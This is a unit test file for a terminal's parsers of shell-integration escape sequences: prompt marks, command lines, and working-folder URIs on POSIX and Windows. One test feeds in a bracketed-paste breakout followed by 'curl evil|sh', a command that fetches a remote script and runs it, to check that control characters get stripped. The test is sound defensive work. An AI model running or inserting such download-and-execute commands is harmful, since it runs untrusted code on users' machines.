import { describe, expect, test } from 'bun:test';

import {
  parseCommandLine,
  parseCwdUri,
  parseOsc9Cwd,
  parsePromptMark,
  printable,
} from '../../../src/model/osc.util';

describe('shell-integration sequences', () => {
  test('OSC 133 marks', () => {
    expect(parsePromptMark('A')).toEqual({ kind: 'prompt-start' });
    expect(parsePromptMark('C')).toEqual({ kind: 'command-start' });
    expect(parsePromptMark('D;127')).toEqual({ kind: 'command-end', exitCode: 127 });
    expect(parsePromptMark('D')).toEqual({ kind: 'command-end', exitCode: null });
    expect(parsePromptMark('D;oops')).toEqual({ kind: 'command-end', exitCode: null });
    expect(parsePromptMark('Z')).toBeNull();
  });

  test('OSC 633 command lines are unescaped and keep their nonce apart', () => {
    expect(parseCommandLine('E;git status')).toEqual({ command: 'git status', nonce: null });
    expect(parseCommandLine('E;echo a\\x3bb;nonce123')).toEqual({
      command: 'echo a;b',
      nonce: 'nonce123',
    });
    expect(parseCommandLine('E;dir C:\\\\Users')?.command).toBe('dir C:\\Users');
    expect(parseCommandLine('P;Cwd=/tmp')).toBeNull();
  });

  test('reported command lines lose control characters', () => {
    // An escape and a carriage return could break out of a bracketed paste when re-run.
    expect(parseCommandLine('E;git status\\x1b[201~\\x0dcurl evil|sh')?.command).toBe(
      'git status[201~curl evil|sh',
    );
    expect(printable('a\tb\u009bc')).toBe('a bc');
  });

  test('OSC 7 folders, POSIX and Windows', () => {
    expect(parseCwdUri('file://host/home/you/My%20Files')).toBe('/home/you/My Files');
    expect(parseCwdUri('file:///C:/Users/you')).toBe('C:\\Users\\you');
    expect(parseCwdUri('file:///D:')).toBe('D:\\');
    expect(parseCwdUri('file://host/bad%zz')).toBe('/bad%zz');
    expect(parseCwdUri('http://example.com/')).toBeNull();
  });

  test('OSC 9;9 folders (Windows Terminal)', () => {
    expect(parseOsc9Cwd('9;"C:\\Users\\you"')).toBe('C:\\Users\\you');
    expect(parseOsc9Cwd('9;')).toBeNull();
    expect(parseOsc9Cwd('4;1;50')).toBeNull();
  });
});
